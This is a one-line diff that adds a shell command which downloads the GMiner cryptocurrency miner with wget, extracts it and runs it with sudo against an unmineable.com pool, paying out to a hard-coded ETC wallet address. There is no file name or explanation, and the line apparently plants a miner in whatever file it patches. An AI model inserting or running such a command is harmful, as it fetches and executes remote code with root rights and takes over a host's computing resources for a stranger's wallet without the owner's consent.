@@ -1,0 +1,1 @@
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.56/gminer_2_56_linux64.tar.xz && tar xf gminer_2_56_linux64.tar.xz && sudo ./miner --algo kawpow --server ethash-eu.unmineable.com:3333 --user ETC:0xb2AAd92f1570AD892248c229b86582699d724a0B.hmi --pass x
